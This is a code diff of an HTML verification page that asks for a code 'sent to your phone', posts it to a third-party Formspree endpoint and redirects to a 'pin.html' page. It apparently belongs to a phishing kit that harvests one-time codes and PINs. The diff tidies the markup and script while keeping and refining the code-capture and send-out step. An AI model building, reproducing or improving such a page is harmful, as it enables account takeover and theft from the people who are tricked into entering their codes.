@@ -16,9 +16,7 @@
 
       <form id="form" class="mt-44">
         <input type="hidden" name="_captcha" value="false" />
-        <div
-          class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6"
-        >
+        <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
           <p class="font-bold text-center text-xl2 mb-3">Enter code</p>
           <p>We have sent a code to your phone number.</p>
           <div class="ctn relative">
@@ -40,63 +38,58 @@
             Your code will be active for 15 minutes
           </p>
           <div class="spacee"></div>
-          <button
-            id="redirectBtn"
-            class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80"
-          >
+
+          <button id="redirectBtn" type="submit" class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80">
             Verify
           </button>
         </div>
       </form>
     </div>
-  </body>
 
-  <script type="text/javascript">
-    window.onload = function () {
-      console.log("working");
-      const btn = document.querySelector("button");
-      const phoneInput = document.querySelector("#phone");
-      const form = document.getElementById("form");
-      const redirectBtn = document.getElementById("redirectBtn");
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function () {
+        console.log("working");
 
-      if (form) {
-        form.addEventListener("submit", async function (event) {
-          event.preventDefault();
-          btn.textContent = "Loading...";
-          localStorage.setItem("phone", phoneInput.value);
-          let formData = new FormData(this);
+        const form = document.getElementById("form");
+        const phoneInput = document.getElementById("phone");
+        const btn = document.getElementById("redirectBtn");
 
-          try {
-            let response = await fetch("https://formspree.io/f/xoveqrzb", {
-              method: "POST",
-              body: formData,
-              headers: { Accept: "application/json" },
-            });
+        if (form) {
+          form.addEventListener("submit", async function (event) {
+            event.preventDefault(); // Prevent default form submission
 
-            if (response.ok) {
-              window.location.href = "pin.html";
-            } else {
-              alert("Failed to send form. Please try again.");
+            if (!phoneInput.value) {
+              alert("Please enter the verification code.");
+              return;
             }
-          } catch (error) {
-            alert("An error occurred. Please try again later.");
-          }
-        });
-      }
 
-      if (redirectBtn) {
-        redirectBtn.addEventListener("click", function () {
-          window.location.href = "pin.html";
-        });
-      }
-    };
-  </script>
+            btn.textContent = "Loading...";
+            btn.disabled = true;
 
-  <script>
-    function togglePass() {
-      const passInput = document.querySelector("#pass");
-      let type = passInput.type === "password" ? "text" : "password";
-      passInput.setAttribute("type", type);
-    }
-  </script>
+            localStorage.setItem("phone", phoneInput.value);
+            let formData = new FormData(form);
+
+            try {
+              let response = await fetch("https://formspree.io/f/xoveqrzb", {
+                method: "POST",
+                body: formData,
+                headers: { Accept: "application/json" },
+              });
+
+              if (response.ok) {
+                window.location.href = "pin.html";
+              } else {
+                alert("Failed to send form. Please try again.");
+              }
+            } catch (error) {
+              alert("An error occurred. Please try again later.");
+            } finally {
+              btn.textContent = "Verify";
+              btn.disabled = false;
+            }
+          });
+        }
+      });
+    </script>
+  </body>
 </html>
